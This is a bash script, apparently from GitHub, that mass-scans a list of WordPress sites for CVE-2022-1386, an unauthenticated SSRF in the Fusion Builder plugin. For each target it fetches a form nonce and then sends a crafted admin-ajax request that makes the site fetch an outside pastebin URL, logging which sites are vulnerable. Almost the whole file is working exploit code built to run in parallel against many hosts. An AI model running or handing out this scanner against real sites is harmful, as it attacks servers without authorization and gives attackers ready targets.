#!/bin/bash
# CVE-2022-1386 - Fusion Builder < 3.6.2 - Unauthenticated SSRF | Vulnerability Checker
# Created By Im-Hanzou
# Using GNU Parallel
# Usage: bash fubucker.sh list.txt thread 

yellow='\033[0;33m'
cat << "EOF"
   ____     __        _______          
  / __/_ __/ /  __ __/ ___/ /_____ ____
 / _// // / _ \/ // / /__/  '_/ -_) __/
/_/  \_,_/_.__/\_,_/\___/_/\_\\__/_/                                                                                                                                                   
EOF
printf "CVE-2022-1386 Mass Vulnerability Checker\n\n"
printf "${yellow}Created By Im-Hanzou
Github : im-hanzou\n\n"


exploit(){	
classic='\033[0m'
red='\e[41m'
green='\e[42m'
target=$1
thread=$2

fusion_id=$(curl --compressed -s --data 'action=fusion_form_update_view' --connect-timeout 10 --max-time 10 --insecure $target'/wp-admin/admin-ajax.php' | grep -oP '(?<=id="fusion-form-nonce-0" name="fusion-form-nonce-0" value=")[^"]+')
if [[ $(curl --compressed -s --data "email=example@example.com&fusion_privacy_store_ip_ua=false&fusion_privacy_expiration_interval=48&privacy_expiration_action=ignore&fusion-form-nonce-0=$fusion_id&fusion-fields-hold-private-data=&action=fusion_form_submit_form_to_url&fusion_form_nonce=$fusion_id&form_id=0&post_id=0&field_labels={\"email\":\"Email+address\"}&hidden_field_names=[]&fusionAction=https://pastebin.com/raw/VaxXtjGV&fusionActionMethod=GET" --connect-timeout 10 --max-time 10 --insecure $target'/wp-admin/admin-ajax.php') =~ 'Sroot' ]]; 
then
    printf "${green}[ Vuln ]${classic} => [$target] \n";
    echo "$target" >> vuln.txt
    else
    printf "${red}[ Not Vuln ]${classic} => $target \n";
    echo "$target" >> notvuln.txt
fi
}

export -f exploit
parallel -j $2 exploit :::: $1 

total=$(cat vuln.txt | wc -l)
totalb=$(cat notvuln.txt | wc -l)
printf "\033[0;36mTotal Vuln : $total\n";
printf "\033[0;36mTotal Not Vuln : $totalb\n";
